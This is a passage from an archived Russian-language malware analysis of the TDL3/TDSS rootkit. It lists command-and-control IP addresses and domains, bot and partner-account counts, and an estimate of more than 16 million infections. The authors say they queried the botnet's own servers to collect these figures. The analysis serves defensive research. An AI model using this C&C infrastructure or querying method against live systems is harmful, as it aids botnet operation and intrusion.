<div class="figure"><img src="TDSS%20%D0%BF%D0%BE%D0%BB%D0%BD%D0%BE%D0%B5%20%D1%80%D0%B0%D1%81%D0%BA%D1%80%D1%8B%D1%82%D0%B8%D0%B5_files/stat_tdlcmd_ver.png" width="600" height="300" alt="Версии модуля TDLCMD.DLL"><p>Версии модуля <code>TDLCMD.DLL</code></p></div>

<p>Поскольку сервер <code>d45648675.cn</code> функционирует и в 
настоящее время, мы приняли решение собрать обновлённую статистику на 
момент написания статьи (14 июля 2010) с помощью механизмов, 
предоставляемых описанным выше специальным запросом типа <code>services</code>.
 Мы также проанализировали несколько десятков инсталляторов руткита 
TDL3, чтобы выявить адреса всех активных командных серверов.</p>

<p>Помимо сервера, соответствующего доменному имени <code>d45648675.cn</code> (и ряду других), на данный момент также используется второй сервер <code>a57990057.cn</code>.
 Каждый из двух серверов имеет несколько IP-адресов, и каждому IP-адресу
 сопоставлено несколько доменов. Список IP-адресов и доменов для обоих 
серверов приведён в следующей таблице:</p>

<table class="data">
<colgroup><col width="20%">
<col width="20%">
<col width="20%">
<col width="20%">
<col width="20%">
</colgroup><thead>
<tr>

<td>IP-адрес</td>
<td>Доменное имя</td>
<td>Количество ботов за всё время</td>
<td>Количество учётных записей партнёров</td>
<td>Дата установки первого бота</td>
</tr>
</thead>
<tbody>
<tr>
<td>91.212.226.60</td>
<td><code>d45648675.cn</code></td>

<td class="num" rowspan="3">8&nbsp;547&nbsp;241</td>
<td class="num" rowspan="3">857</td>
<td class="num" rowspan="3">12.08.2009</td>
</tr>
<tr>
<td>91.212.226.59</td>
<td><code>zz87jhfda88.com</code></td>
</tr>
<tr>
<td>91.212.226.59</td>

<td><code>lj1i16b0.com</code></td>
</tr>
</tbody>
<tbody>
<tr>
<td>61.61.20.132</td>
<td><code>a57990057.cn</code></td>
<td class="num" rowspan="5">7&nbsp;860&nbsp;677</td>
<td class="num" rowspan="5">2&nbsp;547</td>

<td class="num" rowspan="5">31.12.2009</td>
</tr>
<tr>
<td>61.61.20.132</td>
<td><code>68b6b6b6.com</code></td>
</tr>
<tr>
<td>91.212.226.7</td>
<td><code>0o0o0o0o0.com</code></td>
</tr>
<tr>
<td>61.61.20.135</td>

<td><code>jro1ni1l1.com</code></td>
</tr>
<tr>
<td>61.61.20.135</td>
<td><code>34jh7alm94.asia</code></td>
</tr></tbody>
</table>

<div class="aside">
<p>Federal Bureau of Investigation. <a href="https://web.archive.org/web/20180310124741/http://www.fbi.gov/pressrel/pressrel10/mariposa072810.htm">FBI, Slovenian and Spanish Police Arrests Mariposa Botnet Creator, Operators</a>.</p>
</div>

<p>Как видно из таблицы, в период с 07.02.2010 по 14.07.2010 количество 
ботов, прошедших через первый сервер, выросло почти на 40%, а общее 
количество компьютеров, заражённых руткитом TDL3 в период с 12.08.2009 
по 14.07.2010, составило более 16&nbsp;000&nbsp;000. Крупнейшим ботнетом
 в мире до настоящего момента считался ботнет Mariposa, объём которого 
на момент его закрытия был оценён экспертами в 12&nbsp;000&nbsp;000 
зомби-машин. </p>
<p class="author" style="padding-left: 0px;">Last updated: 17.03.2012</p>
</div>
  ﻿</div>
  <div id="footer">
    <p class="copyright">© 2009–2012 <a href="https://web.archive.org/web/20180310124741/http://www.nobunkum.ru/">NOBUNKUM</a> by <a href="https://web.archive.org/web/20180310124741/http://www.esagelab.ru/">Esage Lab</a> &nbsp;&nbsp;&nbsp;&nbsp;<a href="https://web.archive.org/web/20180310124741/http://nobunkum.ru/ru/">/на русском языке</a> <a href="https://web.archive.org/web/20180310124741/http://nobunkum.ru/about">/about</a> <a href="https://web.archive.org/web/20180310124741/http://nobunkum.ru/rss">/rss</a></p>
  </div>
  <script type="text/javascript">
  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-3546318-9']);
  _gaq.push(['_trackPageview']);
  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://web.archive.org/web/20180310124741/https://ssl' : 'https://web.archive.org/web/20180310124741/http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();
</script>


</body></html>
<!--
     FILE ARCHIVED ON 12:47:41 Mar 10, 2018 AND RETRIEVED FROM THE
     INTERNET ARCHIVE ON 12:20:21 May 30, 2024.
     JAVASCRIPT APPENDED BY WAYBACK MACHINE, COPYRIGHT INTERNET ARCHIVE.

     ALL OTHER CONTENT MAY ALSO BE PROTECTED BY COPYRIGHT (17 U.S.C.
     SECTION 108(a)(3)).
-->
<!--
playback timings (ms):
  captures_list: 3.825
  exclusion.robots: 0.241
  exclusion.robots.policy: 0.228
  esindex: 0.01
  cdx.remote: 27.774
  LoadShardBlock: 188.31 (3)
  PetaboxLoader3.datanode: 232.095 (4)
  load_resource: 140.833
  PetaboxLoader3.resolve: 51.476
-->